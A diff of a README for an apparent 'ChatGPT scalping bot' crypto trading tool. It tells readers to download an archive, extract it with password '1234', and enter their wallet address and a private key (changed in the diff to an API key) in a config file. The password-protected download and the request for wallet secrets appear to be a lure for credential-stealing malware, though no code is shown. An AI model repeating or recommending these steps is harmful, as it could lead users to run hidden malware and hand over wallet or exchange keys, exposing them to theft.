@@ -4,8 +4,7 @@ logo
 
 # Usage
  - [Download](https://github.com/exileqeq/chatgpt-scalping-bot/archive/refs/heads/main.zip) the repository release and extract files with password `1234`.
-- Edit the `address` and `private_key` fields in the `config.json` file.
-- To get started, write your telegram id in the console.
+- Edit the `address` and `API_KEY` fields in the `config.json` file.
   
 ## Scalping on Binance - Step-by-Step Guide
 I asked chatgpt to give me a step-by-step algorithm for trading cryptocurrency on the binance exchange, and this is what he gave me:
